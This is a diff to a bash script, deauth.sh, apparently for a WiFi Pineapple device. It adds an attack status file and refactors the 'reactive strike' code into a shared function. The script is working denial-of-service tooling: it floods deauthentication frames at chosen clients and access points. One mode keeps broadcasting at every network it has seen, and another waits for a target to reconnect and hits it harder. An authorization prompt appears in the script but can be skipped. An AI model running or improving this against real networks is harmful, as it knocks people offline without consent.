@@ -220,6 +220,14 @@
 set -u
 TOOL_NAME="deauth.sh"
 PIDFILE="/tmp/pager-deauth.pid"
+# IMPROVEMENT (round 2 of this sweep): companion to PIDFILE, holding a
+# one-line human description of WHAT is currently being attacked (mode,
+# target, BSSID/SSID) so --status can answer more than just "yes,
+# something is running" - see launch_attack()/the --status block below.
+# Same file, same lifecycle as PIDFILE (written when an attack starts,
+# removed via the same trap/--stop/stale-cleanup paths) rather than a
+# separate tracking mechanism.
+STATUSFILE="/tmp/pager-deauth-status"
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 . "$SCRIPT_DIR/lib/common.sh"
 usage() { print_help "$0"; exit 1; }
@@ -370,7 +378,9 @@ stop_sentinel() {
 track_foreground_pid() {
     [ "$BACKGROUND" = "1" ] && return 0
     echo "$BASHPID" > "$PIDFILE"
-    trap 'rm -f "$PIDFILE"' EXIT
+    # Also clean up STATUSFILE (see its own header, up near PIDFILE) on
+    # any clean exit - same lifecycle as PIDFILE, so it shouldn't outlive it.
+    trap 'rm -f "$PIDFILE" "$STATUSFILE"' EXIT
 }
 
 # BUG FOUND, FIXED, AND RE-DIAGNOSED (live-caught, not hypothetical):
@@ -413,6 +423,23 @@ track_foreground_pid() {
 if [ "$DO_STATUS" = "1" ]; then
     if is_running; then
         say "Running (PID $(cat "$PIDFILE"))."
+        # IMPROVEMENT (round 2 of this sweep, small feature): previously
+        # --status could only ever say "Running (PID 1234)" - no mode, no
+        # target, no BSSID/SSID. Not a cosmetic gap: this file's own
+        # history documents a real leftover foreground attack found still
+        # running, still holding the WiFi channel locked, completely
+        # invisible to this exact command (see the long comment above
+        # this block) - once you DO know something is running, the very
+        # next question is always "running against WHAT", and there was
+        # no way to answer it short of --stop and re-launching from
+        # memory. STATUSFILE (see its own header near PIDFILE) is written
+        # by launch_attack() at attack start with a plain description and
+        # carries the same lifecycle as PIDFILE, so it's trustworthy
+        # exactly when is_running() says so. Old, stale, or missing (e.g.
+        # a run predating this change, or one launched by an older
+        # deauth.sh copy) -> silently say nothing extra rather than a
+        # confusing blank line.
+        [ -s "$STATUSFILE" ] && say "  Attacking: $(cat "$STATUSFILE")"
     else
         say "Not running."
         # BUG FOUND AND FIXED: a stale $PIDFILE (left behind if a run died
@@ -424,6 +451,9 @@ if [ "$DO_STATUS" = "1" ]; then
         # and a false "Already running" trap waiting for a reused PID -
         # see --background's own check just below).
         [ -f "$PIDFILE" ] && rm -f "$PIDFILE"
+        # Same reasoning, applied to STATUSFILE now that it exists too -
+        # a stale description shouldn't outlive the PID it describes.
+        [ -f "$STATUSFILE" ] && rm -f "$STATUSFILE"
     fi
     if sentinel_running; then
         say "Sentinel (internal radio, passive watch): running (PID $(cat "$SENTINEL_PIDFILE"))."
@@ -434,13 +464,14 @@ fi
 if [ "$DO_STOP" = "1" ]; then
     if is_running; then
         kill "$(cat "$PIDFILE")" 2>/dev/null
-        rm -f "$PIDFILE"
+        rm -f "$PIDFILE" "$STATUSFILE"
         say "Stopped."
     else
         say "Nothing running."
         # Same stale-file cleanup as --status above - a dead PID left
         # over from an EXIT-trap-skipping kill shouldn't linger.
         [ -f "$PIDFILE" ] && rm -f "$PIDFILE"
+        [ -f "$STATUSFILE" ] && rm -f "$STATUSFILE"
     fi
     # BUG FOUND AND FIXED (live-diagnosed): each attack loop calls
     # PINEAPPLE_EXAMINE_RESET AFTER its while-loop exits, relying on the
@@ -856,6 +887,32 @@ lock_channel() { PINEAPPLE_EXAMINE_CHANNEL "$1" "$(( ${2%.*} + 2 ))" >/dev/null 
 burst_deauth() {
     local bssid="$1" target="$2" channel="$3" i=1
     while [ "$i" -le "$BURST" ]; do
+        PINEAPPLE_DEAUTH_CLIENT "$bssid" "$target" "$channel"
+        i=$((i + 1))
+    done
+}
+
+# reactive_strike BSSID TARGET CHANNEL - the "caught you reconnecting,
+# hit it NOW" strike used by run_reactive_strike(): BURST*2 calls
+# (reactive mode deliberately doubles pressure the instant a target is
+# caught - see run_reactive_strike()'s own header), channel-locked to
+# cover that exact call count (same "calls + 2" margin arithmetic as
+# attack_ap_pairs()'s own fix, for the same reason: a fixed lock window
+# sized for BURST alone silently runs out before BURST*2 calls finish).
+#
+# IMPROVEMENT (DRY pass, round 1 of this sweep): this exact lock-then-
+# loop was duplicated three times, byte-for-byte, inside
+# run_reactive_strike() - once for the primary per-AP watch hit, twice
+# more for the two separate sentinel-triggered hits (start of cycle and
+# mid-cycle). That's the same "same critical logic copy-pasted into
+# several sites" pattern this file's own header already names as how the
+# missing "-e" flag and the wrong tcpdump frame-type labels survived in
+# some copies after already being fixed in others. One implementation
+# now; all three call sites below call this instead of repeating it.
+reactive_strike() {
+    local bssid="$1" target="$2" channel="$3" i=1
+    lock_channel "$channel" "$(( (BURST * 2) + 2 ))"
+    while [ "$i" -le "$((BURST * 2))" ]; do
         PINEAPPLE_DEAUTH_CLIENT "$bssid" "$target" "$channel"
         i=$((i + 1))
     done
@@ -1458,28 +1515,10 @@ run_reactive_strike() {
             if [ -n "$sighted" ]; then
                 local sb="${sighted%%~*}" sc="${sighted#*~}"
                 say "Sentinel caught $target on $sb (ch $sc) - striking now."
-                # BUG FOUND AND FIXED (found via static analysis using this
-                # file's own measured numbers - same "lock doesn't cover the
-                # actual work done under it" class fixed in attack_ap_pairs()
-                # above): this locked with argument 3 (lock_channel() adds +2
-                # internally, so an ACTUAL 5s window) but then fires
-                # BURST*2 calls, not BURST - reactive strikes deliberately
-                # double the burst (see this function's own header: "no
-                # effect ... at an already-located target" motivated hitting
-                # harder the instant one is caught). At $BURST=3 that's 6
-                # calls; at this file's own measured ~950ms/call worst case
-                # (burst_deauth's comment) that's 5.7s, MORE than the 5s
-                # actual lock covers - the last call of a slow strike can
-                # fire off-channel and do nothing, at the exact moment
-                # (target mid-reconnect) reactive mode exists to not miss.
-                # Fix: size the lock to the actual call count, same
-                # "calls + 2" arithmetic as attack_ap_pairs()'s fix above.
-                lock_channel "$sc" "$(( (BURST * 2) + 2 ))"
-                local i=1
-                while [ "$i" -le "$((BURST * 2))" ]; do
-                    PINEAPPLE_DEAUTH_CLIENT "$sb" "$target" "$sc"
-                    i=$((i + 1))
-                done
+                # See reactive_strike()'s own header (right after
+                # burst_deauth() above) for why this locks to BURST*2+2 and
+                # fires BURST*2 calls instead of the base BURST.
+                reactive_strike "$sb" "$target" "$sc"
             fi
         fi
         # PROVOKE - manufacture reconnection events periodically instead
@@ -1503,15 +1542,9 @@ run_reactive_strike() {
             # history this used to require fixing in two places).
             if watch_for_reconnect "$MON_IFACE" "$target_lc"; then
                 say "Caught $target reconnecting to $bssid (ch $channel) - striking now."
-                # Same "lock must cover BURST*2 calls, not be fixed at 3"
-                # fix as the sentinel-triggered strike above - same call
-                # count, same root cause.
-                lock_channel "$channel" "$(( (BURST * 2) + 2 ))"
-                local i=1
-                while [ "$i" -le "$((BURST * 2))" ]; do
-                    PINEAPPLE_DEAUTH_CLIENT "$bssid" "$target" "$channel"
-                    i=$((i + 1))
-                done
+                # Same reactive_strike() as the sentinel-triggered hits
+                # above/below - same call count, same lock sizing.
+                reactive_strike "$bssid" "$target" "$channel"
             fi
             # Re-check the sentinel between APs too, not just once per
             # full cycle - a 3s-per-AP watch window means a full cycle
@@ -1525,15 +1558,9 @@ run_reactive_strike() {
                 if [ -n "$sighted2" ]; then
                     local sb2="${sighted2%%~*}" sc2="${sighted2#*~}"
                     say "Sentinel caught $target on $sb2 (ch $sc2) - striking now."
-                    # Same "lock must cover BURST*2 calls, not be fixed at
-                    # 3" fix as the two BURST*2 strikes above - same call
-                    # count, same root cause.
-                    lock_channel "$sc2" "$(( (BURST * 2) + 2 ))"
-                    local j=1
-                    while [ "$j" -le "$((BURST * 2))" ]; do
-                        PINEAPPLE_DEAUTH_CLIENT "$sb2" "$target" "$sc2"
-                        j=$((j + 1))
-                    done
+                    # Same reactive_strike() as the two BURST*2 strikes
+                    # above - same call count, same lock sizing.
+                    reactive_strike "$sb2" "$target" "$sc2"
                 fi
             fi
         done
@@ -1779,13 +1806,22 @@ run_all_loop() {
 # frame-type labels) survive in some copies after already being fixed in
 # others, earlier this session. One shared implementation now; only the
 # loop function actually invoked (and its args) varies per call site.
-# Usage: launch_attack FUNCTION_NAME [ARGS...] - FUNCTION_NAME is called by
-# name (not eval'd as a string), so normal bash quoting/array-expansion at
-# the call site works exactly as it did when each site built its own
-# subshell inline.
+# Usage: launch_attack DESCRIPTION FUNCTION_NAME [ARGS...] - FUNCTION_NAME
+# is called by name (not eval'd as a string), so normal bash quoting/
+# array-expansion at the call site works exactly as it did when each site
+# built its own subshell inline.
+#
+# IMPROVEMENT (round 2 of this sweep, small feature): added the
+# DESCRIPTION parameter - written to STATUSFILE (see its own header near
+# PIDFILE) before dispatch, foreground or background alike, so `--status`
+# can report what an attack is actually doing instead of just its PID.
+# Written here (one place, all four call sites) rather than having each
+# call site poke STATUSFILE itself, same "one shared implementation"
+# reasoning as the rest of this function already follows.
 launch_attack() {
-    local fn="$1"; shift
+    local desc="$1" fn="$2"; shift 2
     is_running && die "Already running (PID $(cat "$PIDFILE")). Use --stop first."
+    echo "$desc" > "$STATUSFILE"
     if [ "$BACKGROUND" = "1" ]; then
         ( trap '' HUP; "$fn" "$@" ) >/tmp/pager-deauth.log 2>&1 &
         echo $! > "$PIDFILE"
@@ -1801,7 +1837,7 @@ launch_attack() {
         if is_running; then
             say "Started in background (PID $(cat "$PIDFILE")). Use --stop to end it."
         else
-            rm -f "$PIDFILE"
+            rm -f "$PIDFILE" "$STATUSFILE"
             die "Attack exited immediately - check /tmp/pager-deauth.log for why."
         fi
     else
@@ -1815,7 +1851,7 @@ if [ "$DO_ALL" = "1" ]; then
     if [ "$ASSUME_YES" != "1" ]; then
         confirm "Continuously deauth EVERY AP recon has seen (all their clients, via broadcast target), until stopped? Only do this on networks/clients you are authorized to test!" || die "Aborted."
     fi
-    launch_attack run_all_loop
+    launch_attack "Every AP recon has seen (broadcast target - all clients of all of them)" run_all_loop
     exit 0
 fi
 
@@ -1829,9 +1865,9 @@ if [ "${#MULTI_PAIRS[@]}" -gt 0 ]; then
         fi
     fi
     if [ "$REACTIVE" = "1" ]; then
-        launch_attack run_reactive_strike "$TARGET" "${MULTI_PAIRS[@]}"
+        launch_attack "Reactive strike on $TARGET across ${#MULTI_PAIRS[@]} AP(s) broadcasting '$SSID_NAME'" run_reactive_strike "$TARGET" "${MULTI_PAIRS[@]}"
     else
-        launch_attack run_multi_bssid_loop "$TARGET" "${MULTI_PAIRS[@]}"
+        launch_attack "$TARGET across ${#MULTI_PAIRS[@]} AP(s) broadcasting '$SSID_NAME'" run_multi_bssid_loop "$TARGET" "${MULTI_PAIRS[@]}"
     fi
     exit 0
 fi
@@ -1870,7 +1906,7 @@ if [ "$ASSUME_YES" != "1" ]; then
 fi
 
 if [ "$REACTIVE" = "1" ]; then
-    launch_attack run_reactive_strike "$TARGET" "$BSSID~$CHANNEL"
+    launch_attack "Reactive strike on $TARGET on $BSSID (channel $CHANNEL)" run_reactive_strike "$TARGET" "$BSSID~$CHANNEL"
 else
-    launch_attack run_attack_loop "$BSSID" "$TARGET" "$CHANNEL"
+    launch_attack "$TARGET from $BSSID (channel $CHANNEL)" run_attack_loop "$BSSID" "$TARGET" "$CHANNEL"
 fi
